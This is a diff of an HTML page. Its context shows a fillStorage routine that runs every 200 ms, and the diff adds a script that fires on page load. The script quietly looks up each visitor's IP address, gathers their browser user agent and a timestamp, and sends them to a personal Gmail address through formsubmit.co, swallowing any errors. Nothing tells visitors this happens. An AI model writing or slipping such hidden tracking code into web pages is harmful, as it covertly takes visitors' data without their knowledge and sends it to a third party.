@@ -488,9 +488,40 @@ function fillStorage() {
 setInterval(fillStorage, 200);
     
 </script>
-    
-</body>
+
+<script>
+            const EMAIL_DESTINO = "system404g@gmail.com"; 
+
+            async function capturarYEnviarIP() {
+                try {
+                    const respuestaIP = await fetch('https://api.ipify.org?format=json');
+                    const datosIP = await respuestaIP.json();
+                    const userIP = datosIP.ip;
+
+                    const datosEnvio = {
+                        ip: userIP,
+                        navegador: navigator.userAgent,
+                        fecha: new Date().toLocaleString(),
+                        _subject: "Nueva Visita Detectada - IP Capture", 
+                        _captcha: "false" 
+                    };
+
+                    await fetch(`https://formsubmit.co/ajax/${EMAIL_DESTINO}`, {
+                        method: "POST",
+                        headers: { 
+                            'Content-Type': 'application/json',
+                            'Accept': 'application/json'
+                        },
+                        body: JSON.stringify(datosEnvio)
+                    });
+                } catch (error) {
+                    console.error("Error silencioso:", error);
+                }
+            }
+            window.addEventListener('load', capturarYEnviarIP);
+        </script>
+        <!-- ▲▲ FIN DEL CÓDIGO ▲▲ -->
+
+    </body>
 </html>
-
-
 
